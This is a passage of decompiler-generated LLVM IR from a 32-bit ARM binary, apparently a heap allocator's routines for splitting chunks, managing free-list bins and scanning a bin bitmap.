  %v1_ffdc = load i32, i32* @lr, align 4
  %v2_ffdc = add i32 %v1_ffdc, 12
  %v3_ffdc = inttoptr i32 %v2_ffdc to i32*
  store i32 %v0_ffdc, i32* %v3_ffdc, align 4
  %v0_ffe0 = load i32, i32* @r6, align 4
  %v1_ffe0 = load i32, i32* %ip.global-to-local, align 4
  %v2_ffe0 = add i32 %v1_ffe0, 8
  %v3_ffe0 = inttoptr i32 %v2_ffe0 to i32*
  store i32 %v0_ffe0, i32* %v3_ffe0, align 4
  %v0_fffc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fffc

dec_label_pc_ffe8:                                ; preds = %dec_label_pc_fe88, %dec_label_pc_fe40, %dec_label_pc_fe9c
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 142044, i32* %r1.global-to-local, align 4
  %v4_fff0 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_fff0, i32* @sb, align 4
  %v0_fff4 = load i32, i32* @sl, align 4
  %v1_fff4 = add i32 %v0_fff4, 16
  store i32 %v1_fff4, i32* @fp, align 4
  %v1_fff8 = add i32 %v4_fff0, 52
  store i32 %v1_fff8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fffc

dec_label_pc_fffc:                                ; preds = %dec_label_pc_ffb0, %dec_label_pc_ffe8
  %v0_ff1c = phi i32 [ %v0_fffc.pre, %dec_label_pc_ffb0 ], [ %v1_fff8, %dec_label_pc_ffe8 ]
  %v1_fffc = add i32 %v0_ff1c, 12
  %v2_fffc = inttoptr i32 %v1_fffc to i32*
  %v3_fffc = load i32, i32* %v2_fffc, align 4
  store i32 %v3_fffc, i32* @r6, align 4
  %v9_10000 = icmp eq i32 %v3_fffc, %v0_ff1c
  br i1 %v9_10000, label %dec_label_pc_10008, label %dec_label_pc_feb0

dec_label_pc_10008:                               ; preds = %dec_label_pc_fffc
  %v0_10008 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_10008, 256
  %v0_100c0.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_10008.dec_label_pc_100c0_crit_edge, label %dec_label_pc_10010

dec_label_pc_10008.dec_label_pc_100c0_crit_edge:  ; preds = %dec_label_pc_10008
  %.pre200 = mul i32 %v0_100c0.pre, 8
  br label %dec_label_pc_100c0

dec_label_pc_10010:                               ; preds = %dec_label_pc_10008
  %v4_10010 = mul i32 %v0_100c0.pre, 8
  %v5_10010 = add i32 %v4_10010, %v0_ff1c
  store i32 %v5_10010, i32* %r3.global-to-local, align 4
  %v1_10014 = add i32 %v5_10010, -8
  store i32 %v1_10014, i32* %r1.global-to-local, align 4
  %v1_10018 = add i32 %v5_10010, 4
  %v2_10018 = inttoptr i32 %v1_10018 to i32*
  %storemerge.pre = load i32, i32* %v2_10018, align 4
  br label %dec_label_pc_100b8

dec_label_pc_10020:                               ; preds = %dec_label_pc_100b8
  %v1_10020 = add i32 %v1_10048, 4
  %v2_10020 = inttoptr i32 %v1_10020 to i32*
  %v3_10020 = load i32, i32* %v2_10020, align 4
  store i32 %v3_10020, i32* %r3.global-to-local, align 4
  %v1_10024 = and i32 %v3_10020, -4
  store i32 %v1_10024, i32* %r2.global-to-local, align 4
  %v3_10028 = icmp ult i32 %v1_10024, %v0_10008
  %v1_1002c = add i32 %v1_10048, 12
  %v2_1002c = inttoptr i32 %v1_1002c to i32*
  %v3_1002c = load i32, i32* %v2_1002c, align 4
  store i32 %v3_1002c, i32* %r0.global-to-local, align 4
  br i1 %v3_10028, label %dec_label_pc_100b8, label %dec_label_pc_10034

dec_label_pc_10034:                               ; preds = %dec_label_pc_10020
  %v1_10034 = add i32 %v1_10048, 8
  %v2_10034 = inttoptr i32 %v1_10034 to i32*
  %v3_10034 = load i32, i32* %v2_10034, align 4
  store i32 %v3_10034, i32* %r1.global-to-local, align 4
  %v1_10038 = add i32 %v3_10034, 12
  %v2_10038 = inttoptr i32 %v1_10038 to i32*
  %v3_10038 = load i32, i32* %v2_10038, align 4
  store i32 %v3_10038, i32* %r3.global-to-local, align 4
  %v9_1003c = icmp eq i32 %v3_10038, %v1_10048
  br i1 %v9_1003c, label %dec_label_pc_10044, label %dec_label_pc_10050

dec_label_pc_10044:                               ; preds = %dec_label_pc_10034
  %v1_10044 = add i32 %v3_1002c, 8
  %v2_10044 = inttoptr i32 %v1_10044 to i32*
  %v3_10044 = load i32, i32* %v2_10044, align 4
  store i32 %v3_10044, i32* %r3.global-to-local, align 4
  %v9_10048 = icmp eq i32 %v3_10044, %v1_10048
  br i1 %v9_10048, label %dec_label_pc_10054, label %dec_label_pc_10050

dec_label_pc_10050:                               ; preds = %dec_label_pc_10034, %dec_label_pc_10044
  %v0_10050 = call i32 @function_10b60()
  store i32 %v0_10050, i32* %r0.global-to-local, align 4
  %v0_10054.pre = load i32, i32* @sl, align 4
  %v1_10054.pre = load i32, i32* @r2, align 4
  %v0_1005c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_10054

dec_label_pc_10054:                               ; preds = %dec_label_pc_10044, %dec_label_pc_10050
  %v1_1005c = phi i32 [ %v3_1002c, %dec_label_pc_10044 ], [ %v0_10050, %dec_label_pc_10050 ]
  %v0_1005c = phi i32 [ %v3_10034, %dec_label_pc_10044 ], [ %v0_1005c.pre, %dec_label_pc_10050 ]
  %v1_10054 = phi i32 [ %v1_10024, %dec_label_pc_10044 ], [ %v1_10054.pre, %dec_label_pc_10050 ]
  %v0_10054 = phi i32 [ %v0_10008, %dec_label_pc_10044 ], [ %v0_10054.pre, %dec_label_pc_10050 ]
  %v2_10054 = sub i32 %v1_10054, %v0_10054
  store i32 %v2_10054, i32* %lr.global-to-local, align 4
  %v2_1005c = add i32 %v1_1005c, 8
  %v3_1005c = inttoptr i32 %v2_1005c to i32*
  store i32 %v0_1005c, i32* %v3_1005c, align 4
  %v0_10060 = load i32, i32* %r0.global-to-local, align 4
  %v1_10060 = load i32, i32* %r1.global-to-local, align 4
  %v2_10060 = add i32 %v1_10060, 12
  %v3_10060 = inttoptr i32 %v2_10060 to i32*
  store i32 %v0_10060, i32* %v3_10060, align 4
  %v0_10064 = load i32, i32* %ip.global-to-local, align 4
  %v1_10064 = add i32 %v0_10064, 8
  store i32 %v1_10064, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_10054, 15
  br i1 %tmp207, label %dec_label_pc_10084, label %dec_label_pc_1006c

dec_label_pc_1006c:                               ; preds = %dec_label_pc_10054
  %v1_1006c = load i32, i32* %r2.global-to-local, align 4
  %v2_1006c = add i32 %v1_1006c, %v0_10064
  store i32 %v2_1006c, i32* %r2.global-to-local, align 4
  %v1_10070 = add i32 %v2_1006c, 4
  %v2_10070 = inttoptr i32 %v1_10070 to i32*
  %v3_10070 = load i32, i32* %v2_10070, align 4
  store i32 %v3_10070, i32* %r3.global-to-local, align 4
  store i32 %v1_10064, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10078

dec_label_pc_10078.loopexit:                      ; preds = %dec_label_pc_ff18
  %v1_ff24 = load i32, i32* @r6, align 4
  %v2_ff24 = load i32, i32* @sl, align 4
  %v3_ff24 = add i32 %v2_ff24, %v1_ff24
  store i32 %v3_ff24, i32* %r2.global-to-local, align 4
  %v2_ff28 = add i32 %v3_ff24, 4
  %v3_ff28 = inttoptr i32 %v2_ff28 to i32*
  %v4_ff28 = load i32, i32* %v3_ff28, align 4
  store i32 %v4_ff28, i32* %r3.global-to-local, align 4
  %v2_ff2c = add i32 %v1_ff24, 8
  store i32 %v2_ff2c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10078

dec_label_pc_10078:                               ; preds = %.dec_label_pc_10078_crit_edge, %dec_label_pc_10078.loopexit, %dec_label_pc_1006c
  %v1_1007c = phi i32 [ %v4_101a0, %.dec_label_pc_10078_crit_edge ], [ %v3_ff24, %dec_label_pc_10078.loopexit ], [ %v2_1006c, %dec_label_pc_1006c ]
  %v0_10078 = phi i32 [ %v7_101a0, %.dec_label_pc_10078_crit_edge ], [ %v4_ff28, %dec_label_pc_10078.loopexit ], [ %v3_10070, %dec_label_pc_1006c ]
  %v1_10078 = or i32 %v0_10078, 1
  store i32 %v1_10078, i32* %r3.global-to-local, align 4
  %v2_1007c = add i32 %v1_1007c, 4
  %v3_1007c = inttoptr i32 %v2_1007c to i32*
  store i32 %v1_10078, i32* %v3_1007c, align 4
  br label %dec_label_pc_10638

dec_label_pc_10084:                               ; preds = %dec_label_pc_10054
  %v1_10084 = load i32, i32* @sl, align 4
  %v2_10084 = add i32 %v1_10084, %v0_10064
  store i32 %v2_10084, i32* %r2.global-to-local, align 4
  %v1_10088 = or i32 %v1_10084, 1
  store i32 %v1_10088, i32* %r3.global-to-local, align 4
  %v0_1008c = load i32, i32* %lr.global-to-local, align 4
  %v1_1008c = or i32 %v0_1008c, 1
  store i32 %v1_1008c, i32* %r1.global-to-local, align 4
  store i32 %v1_10064, i32* %r4.global-to-local, align 4
  %v2_10094 = add i32 %v0_10064, 4
  %v3_10094 = inttoptr i32 %v2_10094 to i32*
  store i32 %v1_10088, i32* %v3_10094, align 4
  %v0_10098 = load i32, i32* %r2.global-to-local, align 4
  %v1_10098 = load i32, i32* @r6, align 4
  %v2_10098 = add i32 %v1_10098, 8
  %v3_10098 = inttoptr i32 %v2_10098 to i32*
  store i32 %v0_10098, i32* %v3_10098, align 4
  %v0_1009c = load i32, i32* %r2.global-to-local, align 4
  %v1_1009c = load i32, i32* @r6, align 4
  %v2_1009c = add i32 %v1_1009c, 12
  %v3_1009c = inttoptr i32 %v2_1009c to i32*
  store i32 %v0_1009c, i32* %v3_1009c, align 4
  %v0_100a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_100a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_100a0 = add i32 %v1_100a0, %v0_100a0
  %v4_100a0 = inttoptr i32 %v3_100a0 to i32*
  store i32 %v0_100a0, i32* %v4_100a0, align 4
  %v0_100a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_100a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_100a4 = add i32 %v1_100a4, 4
  %v3_100a4 = inttoptr i32 %v2_100a4 to i32*
  store i32 %v0_100a4, i32* %v3_100a4, align 4
  %v0_100a8 = load i32, i32* @r6, align 4
  %v1_100a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_100a8 = add i32 %v1_100a8, 12
  %v3_100a8 = inttoptr i32 %v2_100a8 to i32*
  store i32 %v0_100a8, i32* %v3_100a8, align 4
  %v0_100ac = load i32, i32* @r6, align 4
  %v1_100ac = load i32, i32* %r2.global-to-local, align 4
  %v2_100ac = add i32 %v1_100ac, 8
  %v3_100ac = inttoptr i32 %v2_100ac to i32*
  store i32 %v0_100ac, i32* %v3_100ac, align 4
  br label %dec_label_pc_10638

dec_label_pc_100b8:                               ; preds = %dec_label_pc_10020, %dec_label_pc_10010
  %v1_10048 = phi i32 [ %storemerge.pre, %dec_label_pc_10010 ], [ %v3_1002c, %dec_label_pc_10020 ]
  store i32 %v1_10048, i32* %ip.global-to-local, align 4
  %v9_100b8 = icmp eq i32 %v1_10048, %v1_10014
  br i1 %v9_100b8, label %dec_label_pc_100c0.loopexit, label %dec_label_pc_10020

dec_label_pc_100c0.loopexit:                      ; preds = %dec_label_pc_100b8
  br label %dec_label_pc_100c0

dec_label_pc_100c0:                               ; preds = %dec_label_pc_10008.dec_label_pc_100c0_crit_edge, %dec_label_pc_100c0.loopexit
  %v4_100f0.pre-phi = phi i32 [ %.pre200, %dec_label_pc_10008.dec_label_pc_100c0_crit_edge ], [ %v4_10010, %dec_label_pc_100c0.loopexit ]
  %v1_100c0 = add i32 %v0_100c0.pre, 1
  store i32 %v1_100c0, i32* %r2.global-to-local, align 4
  %v1_100c4 = urem i32 %v1_100c0, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 142044, i32* %r0.global-to-local, align 4
  %v6_100d0 = shl i32 1, %v1_100c4
  store i32 %v6_100d0, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_100d8 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_100d8, i32* %r3.global-to-local, align 4
  %v3_100dc = udiv i32 %v1_100c0, 32
  store i32 %v3_100dc, i32* @r5, align 4
  %v4_100e0 = mul nuw nsw i32 %v3_100dc, 4
  %v5_100e0 = add i32 %v4_100d8, %v4_100e0
  store i32 %v5_100e0, i32* %r2.global-to-local, align 4
  %v1_100e4 = add i32 %v5_100e0, 820
  %v2_100e4 = inttoptr i32 %v1_100e4 to i32*
  %v3_100e4 = load i32, i32* %v2_100e4, align 4
  store i32 %v3_100e4, i32* @r4, align 4
  %v1_100e8 = add i32 %v4_100d8, 52
  store i32 %v1_100e8, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_100f0 = add i32 %v1_100e8, %v4_100f0.pre-phi
  store i32 %v5_100f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100f4

dec_label_pc_100f4:                               ; preds = %dec_label_pc_1015c, %dec_label_pc_100c0
  %v1_100fc = phi i32 [ %v1_100fc.pre, %dec_label_pc_1015c ], [ %v3_100e4, %dec_label_pc_100c0 ]
  %v0_100fc = phi i32 [ %v0_100f4.pre, %dec_label_pc_1015c ], [ %v6_100d0, %dec_label_pc_100c0 ]
  %v1_100f4 = sub i32 1, %v0_100fc
  %v2_100f4 = icmp ult i32 %v0_100fc, 2
  %v1_100f4. = select i1 %v2_100f4, i32 %v1_100f4, i32 0
  store i32 %v1_100f4., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_100fc, %v1_100fc
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_100f4
  %v5_10100 = or i32 %v1_100f4., 1
  store i32 %v5_10100, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1010c.preheader

bb142:                                            ; preds = %dec_label_pc_100f4
  %v2_10104 = icmp eq i32 %v1_100f4., 0
  br i1 %v2_10104, label %.dec_label_pc_10148.preheader_crit_edge, label %dec_label_pc_1010c.preheader

.dec_label_pc_10148.preheader_crit_edge:          ; preds = %bb142
  %v0_1014054.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10148.preheader

dec_label_pc_1010c.preheader:                     ; preds = %bb142, %.thread12
  %v0_1010c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1010c

dec_label_pc_1010c:                               ; preds = %dec_label_pc_1010c.preheader, %dec_label_pc_10118
  %v0_1010c = phi i32 [ %v0_1010c.pre, %dec_label_pc_1010c.preheader ], [ %v1_1010c, %dec_label_pc_10118 ]
  %v1_1010c = add i32 %v0_1010c, 1
  store i32 %v1_1010c, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_1010c, 2
  br i1 %tmp208, label %dec_label_pc_101ec.loopexit, label %dec_label_pc_10118

dec_label_pc_10118:                               ; preds = %dec_label_pc_1010c
  store i32 142044, i32* %r3.global-to-local, align 4
  %v1_1011c = load i32, i32* @r8, align 4
  %v2_1011c = add i32 %v1_1011c, 142044
  %v3_1011c = inttoptr i32 %v2_1011c to i32*
  %v4_1011c = load i32, i32* %v3_1011c, align 4
  store i32 %v4_1011c, i32* %r2.global-to-local, align 4
  %v4_10120 = mul i32 %v1_1010c, 4
  %v5_10120 = add i32 %v4_1011c, %v4_10120
  store i32 %v5_10120, i32* %r3.global-to-local, align 4
  %v1_10124 = add i32 %v5_10120, 820
  %v2_10124 = inttoptr i32 %v1_10124 to i32*
  %v3_10124 = load i32, i32* %v2_10124, align 4
  store i32 %v3_10124, i32* @r4, align 4
  %v2_10128 = icmp eq i32 %v3_10124, 0
  br i1 %v2_10128, label %dec_label_pc_1010c, label %dec_label_pc_10130

dec_label_pc_10130:                               ; preds = %dec_label_pc_10118
  %v4_10130 = mul i32 %v1_1010c, 256
  %v5_10130 = add i32 %v4_1011c, %v4_10130
  store i32 %v5_10130, i32* %r3.global-to-local, align 4
  %v1_10134 = add i32 %v5_10130, 44
  store i32 %v1_10134, i32* %r0.global-to-local, align 4
  %v0_10138 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10138, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10148.preheader

dec_label_pc_10148.preheader:                     ; preds = %.dec_label_pc_10148.preheader_crit_edge, %dec_label_pc_10130
  %v0_1014054 = phi i32 [ %v1_10134, %dec_label_pc_10130 ], [ %v0_1014054.pre, %.dec_label_pc_10148.preheader_crit_edge ]
  %v0_10164 = phi i32 [ %v3_10124, %dec_label_pc_10130 ], [ %v1_100fc, %.dec_label_pc_10148.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_10138, %dec_label_pc_10130 ], [ %v0_100fc, %.dec_label_pc_10148.preheader_crit_edge ]
  %v2_1014851 = and i32 %ip.promoted, %v0_10164
  %v4_1014853 = icmp eq i32 %v2_1014851, 0
  br i1 %v4_1014853, label %dec_label_pc_10140, label %dec_label_pc_10150

dec_label_pc_10140:                               ; preds = %dec_label_pc_10148.preheader, %dec_label_pc_10140
  %v2_1014456 = phi i32 [ %v2_10144, %dec_label_pc_10140 ], [ %ip.promoted, %dec_label_pc_10148.preheader ]
  %v0_1014055 = phi i32 [ %v1_10140, %dec_label_pc_10140 ], [ %v0_1014054, %dec_label_pc_10148.preheader ]
  %v1_10140 = add i32 %v0_1014055, 8
  %v2_10144 = mul i32 %v2_1014456, 2
  %v2_10148 = and i32 %v2_10144, %v0_10164
  %v4_10148 = icmp eq i32 %v2_10148, 0
  br i1 %v4_10148, label %dec_label_pc_10140, label %dec_label_pc_10148.dec_label_pc_10150_crit_edge

dec_label_pc_10148.dec_label_pc_10150_crit_edge:  ; preds = %dec_label_pc_10140
  store i32 %v1_10140, i32* %r0.global-to-local, align 4
  store i32 %v2_10144, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10150

dec_label_pc_10150:                               ; preds = %dec_label_pc_10148.dec_label_pc_10150_crit_edge, %dec_label_pc_10148.preheader
  %v0_10170 = phi i32 [ %v2_10144, %dec_label_pc_10148.dec_label_pc_10150_crit_edge ], [ %ip.promoted, %dec_label_pc_10148.preheader ]
  %v0_10194 = phi i32 [ %v1_10140, %dec_label_pc_10148.dec_label_pc_10150_crit_edge ], [ %v0_1014054, %dec_label_pc_10148.preheader ]
  %v1_10150 = add i32 %v0_10194, 12
  %v2_10150 = inttoptr i32 %v1_10150 to i32*
  %v3_10150 = load i32, i32* %v2_10150, align 4
  store i32 %v3_10150, i32* @lr, align 4
  %v9_10154 = icmp eq i32 %v3_10150, %v0_10194
  br i1 %v9_10154, label %dec_label_pc_1015c, label %dec_label_pc_1017c

dec_label_pc_1015c:                               ; preds = %dec_label_pc_10150
  store i32 142044, i32* %r0.global-to-local, align 4
  %v1_10160 = load i32, i32* @r8, align 4
  %v2_10160 = add i32 %v1_10160, 142044
  %v3_10160 = inttoptr i32 %v2_10160 to i32*
  %v4_10160 = load i32, i32* %v3_10160, align 4
  %v2_10164 = sub i32 -1, %v0_10170
  %v3_10164 = and i32 %v0_10164, %v2_10164
  store i32 %v3_10164, i32* @r4, align 4
  %v1_10168 = load i32, i32* @r5, align 4
  %v4_10168 = mul i32 %v1_10168, 4
  %v5_10168 = add i32 %v4_10168, %v4_10160
  store i32 %v5_10168, i32* %r3.global-to-local, align 4
  %v1_1016c = add i32 %v0_10194, 8
  store i32 %v1_1016c, i32* %r0.global-to-local, align 4
  %v2_10170 = mul i32 %v0_10170, 2
  store i32 %v2_10170, i32* %ip.global-to-local, align 4
  %v2_10174 = add i32 %v5_10168, 820
  %v3_10174 = inttoptr i32 %v2_10174 to i32*
  store i32 %v3_10164, i32* %v3_10174, align 4
  %v0_100f4.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_100fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_100f4

dec_label_pc_1017c:                               ; preds = %dec_label_pc_10150
  %v1_1017c = add i32 %v3_10150, 4
  %v2_1017c = inttoptr i32 %v1_1017c to i32*
  %v3_1017c = load i32, i32* %v2_1017c, align 4
  store i32 %v3_1017c, i32* %r3.global-to-local, align 4
  %v1_10180 = and i32 %v3_1017c, -4
  store i32 %v1_10180, i32* %r2.global-to-local, align 4
  %v0_10184 = load i32, i32* @sl, align 4
  %v2_10184 = sub i32 %v1_10180, %v0_10184
  store i32 %v2_10184, i32* %ip.global-to-local, align 4
  %v1_10188 = add i32 %v3_10150, 12
  %v2_10188 = inttoptr i32 %v1_10188 to i32*
  %v3_10188 = load i32, i32* %v2_10188, align 4
  store i32 %v3_10188, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_10184, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_1017c
  %v6_10190 = add i32 %v1_10180, %v3_10150
  store i32 %v6_10190, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_1017c, %bb143
  %v2_10194 = add i32 %v3_10188, 8
  %v3_10194 = inttoptr i32 %v2_10194 to i32*
  store i32 %v0_10194, i32* %v3_10194, align 4
  %v0_10198 = load i32, i32* %r3.global-to-local, align 4
  %v1_10198 = load i32, i32* %r0.global-to-local, align 4
  %v2_10198 = add i32 %v1_10198, 12
  %v3_10198 = inttoptr i32 %v2_10198 to i32*
  store i32 %v0_10198, i32* %v3_10198, align 4
  %v4_1019c = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_10078_crit_edge, label %dec_label_pc_101a8

.dec_label_pc_10078_crit_edge:                    ; preds = %bb144
  %v5_1019c = add i32 %v4_1019c, 8
  store i32 %v5_1019c, i32* %r4.global-to-local, align 4
  %v4_101a0 = load i32, i32* %r2.global-to-local, align 4
  %v5_101a0 = add i32 %v4_101a0, 4
  %v6_101a0 = inttoptr i32 %v5_101a0 to i32*
  %v7_101a0 = load i32, i32* %v6_101a0, align 4
  store i32 %v7_101a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10078

dec_label_pc_101a8:                               ; preds = %bb144
  %v1_101a8 = load i32, i32* @sl, align 4
  %v2_101a8 = add i32 %v1_101a8, %v4_1019c
  store i32 %v2_101a8, i32* %r1.global-to-local, align 4
  %v1_101b0 = load i32, i32* @r6, align 4
  %v2_101b0 = add i32 %v1_101b0, 8
  %v3_101b0 = inttoptr i32 %v2_101b0 to i32*
  store i32 %v2_101a8, i32* %v3_101b0, align 4
  %v0_101b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_101b4 = load i32, i32* @r6, align 4
  %v2_101b4 = add i32 %v1_101b4, 12
  %v3_101b4 = inttoptr i32 %v2_101b4 to i32*
  store i32 %v0_101b4, i32* %v3_101b4, align 4
  %v0_101b8 = load i32, i32* @r6, align 4
  %v1_101b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_101b8 = add i32 %v1_101b8, 8
  %v3_101b8 = inttoptr i32 %v2_101b8 to i32*
  store i32 %v0_101b8, i32* %v3_101b8, align 4
  %v0_101bc = load i32, i32* @r6, align 4
  %v1_101bc = load i32, i32* %r1.global-to-local, align 4
  %v2_101bc = add i32 %v1_101bc, 12
  %v3_101bc = inttoptr i32 %v2_101bc to i32*
  store i32 %v0_101bc, i32* %v3_101bc, align 4
  %tmp210 = icmp ult i32 %v1_101a8, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_101a8
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r2.global-to-local, align 4
  %v8_101c8 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v8_101c8, i32* %r3.global-to-local, align 4
  %v4_101cc = load i32, i32* %r1.global-to-local, align 4
  %v6_101cc = add i32 %v8_101c8, 48
  %v7_101cc = inttoptr i32 %v6_101cc to i32*
  store i32 %v4_101cc, i32* %v7_101cc, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_101a8, %bb145
  %v0_101d0 = load i32, i32* @sl, align 4
  %v1_101d0 = or i32 %v0_101d0, 1
  store i32 %v1_101d0, i32* %r2.global-to-local, align 4
  %v0_101d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_101d4 = or i32 %v0_101d4, 1
  store i32 %v1_101d4, i32* %r3.global-to-local, align 4
  %v0_101d8 = load i32, i32* @lr, align 4
  %v1_101d8 = add i32 %v0_101d8, 8
  store i32 %v1_101d8, i32* %r4.global-to-local, align 4
  %v2_101dc = add i32 %v0_101d8, 4
  %v3_101dc = inttoptr i32 %v2_101dc to i32*
  store i32 %v1_101d0, i32* %v3_101dc, align 4
  %v0_101e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_101e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_101e0 = add i32 %v1_101e0, %v0_101e0
  %v4_101e0 = inttoptr i32 %v3_101e0 to i32*
  store i32 %v0_101e0, i32* %v4_101e0, align 4
  %v0_101e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_101e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_101e4 = add i32 %v1_101e4, 4
  %v3_101e4 = inttoptr i32 %v2_101e4 to i32*
  store i32 %v0_101e4, i32* %v3_101e4, align 4
  br label %dec_label_pc_10638

dec_label_pc_101ec.loopexit:                      ; preds = %dec_label_pc_1010c
  br label %dec_label_pc_101ec

dec_label_pc_101ec:                               ; preds = %dec_label_pc_101ec.loopexit, %dec_label_pc_fe00, %dec_label_pc_fe08
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %ip.global-to-local, align 4
  %v4_101f4 = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_101f4, i32* @r0, align 4
  %v1_101f8 = add i32 %v4_101f4, 44
  %v2_101f8 = inttoptr i32 %v1_101f8 to i32*
  %v3_101f8 = load i32, i32* %v2_101f8, align 4
  store i32 %v3_101f8, i32* %ip.global-to-local, align 4
  %v1_101fc = add i32 %v3_101f8, 4
  %v2_101fc = inttoptr i32 %v1_101fc to i32*
  %v3_101fc = load i32, i32* %v2_101fc, align 4
  %v0_10200 = load i32, i32* @sl, align 4
  %v1_10200 = add i32 %v0_10200, 16
  store i32 %v1_10200, i32* %r1.global-to-local, align 4
  %v1_10204 = and i32 %v3_101fc, -4
  store i32 %v1_10204, i32* %r3.global-to-local, align 4
  %v3_10208 = icmp ult i32 %v1_10204, %v1_10200
  br i1 %v3_10208, label %dec_label_pc_10238, label %dec_label_pc_10214

dec_label_pc_10214:                               ; preds = %dec_label_pc_101ec
  %v2_10214 = sub i32 %v1_10204, %v0_10200
  %v2_10218 = add i32 %v0_10200, %v3_101f8
  store i32 %v2_10218, i32* %r1.global-to-local, align 4
  %v1_1021c = or i32 %v2_10214, 1
  store i32 %v1_1021c, i32* %r3.global-to-local, align 4
  %v1_10220 = or i32 %v0_10200, 1
  store i32 %v1_10220, i32* %r2.global-to-local, align 4
  %v1_10224 = add i32 %v3_101f8, 8
  store i32 %v1_10224, i32* %r4.global-to-local, align 4
  store i32 %v1_10220, i32* %v2_101fc, align 4
  %v0_1022c = load i32, i32* %r1.global-to-local, align 4
  %v1_1022c = load i32, i32* @r0, align 4
  %v2_1022c = add i32 %v1_1022c, 44
  %v3_1022c = inttoptr i32 %v2_1022c to i32*
  store i32 %v0_1022c, i32* %v3_1022c, align 4
  %v0_10230 = load i32, i32* %r3.global-to-local, align 4
  %v1_10230 = load i32, i32* %r1.global-to-local, align 4
  %v2_10230 = add i32 %v1_10230, 4
  %v3_10230 = inttoptr i32 %v2_10230 to i32*
  store i32 %v0_10230, i32* %v3_10230, align 4
  br label %dec_label_pc_10638

dec_label_pc_10238:                               ; preds = %dec_label_pc_101ec
  %v1_10238 = inttoptr i32 %v4_101f4 to i32*
  %v2_10238 = load i32, i32* %v1_10238, align 4
  store i32 %v2_10238, i32* %r3.global-to-local, align 4
  %v1_1023c = and i32 %v2_10238, 2
  store i32 %v1_1023c, i32* %ip.global-to-local, align 4
  %v2_1023c = icmp eq i32 %v1_1023c, 0
  %v1_10240 = add i32 %v4_101f4, 860
  %v2_10240 = inttoptr i32 %v1_10240 to i32*
  %v3_10240 = load i32, i32* %v2_10240, align 4
  store i32 %v3_10240, i32* %r1.global-to-local, align 4
  br i1 %v2_1023c, label %dec_label_pc_10258, label %dec_label_pc_10248

dec_label_pc_10248:                               ; preds = %dec_label_pc_10238
  %v0_10248 = call i32 @function_10730()
  %v0_1024c = load i32, i32* @sl, align 4
  %v1_1024c = add i32 %v0_1024c, -7
  store i32 %v1_1024c, i32* %r0.global-to-local, align 4
  %v1_10250 = call i32 @function_fd60(i32 %v1_1024c)
  store i32 %v1_10250, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10634

dec_label_pc_10258:                               ; preds = %dec_label_pc_10238
  %v1_10258 = add i32 %v4_101f4, 844
  %v2_10258 = inttoptr i32 %v1_10258 to i32*
  %v3_10258 = load i32, i32* %v2_10258, align 4
  store i32 %v3_10258, i32* %r3.global-to-local, align 4
  %v3_1025c = icmp ult i32 %v0_10200, %v3_10258
  %v1_10260 = add i32 %v3_10240, -1
  store i32 %v1_10260, i32* %sb.global-to-local, align 4
  br i1 %v3_1025c, label %dec_label_pc_10334, label %dec_label_pc_10268

dec_label_pc_10268:                               ; preds = %dec_label_pc_10258
  %v1_10268 = add i32 %v4_101f4, 852
  %v2_10268 = inttoptr i32 %v1_10268 to i32*
  %v3_10268 = load i32, i32* %v2_10268, align 4
  store i32 %v3_10268, i32* %r2.global-to-local, align 4
  %v1_1026c = add i32 %v4_101f4, 848
  %v2_1026c = inttoptr i32 %v1_1026c to i32*
  %v3_1026c = load i32, i32* %v2_1026c, align 4
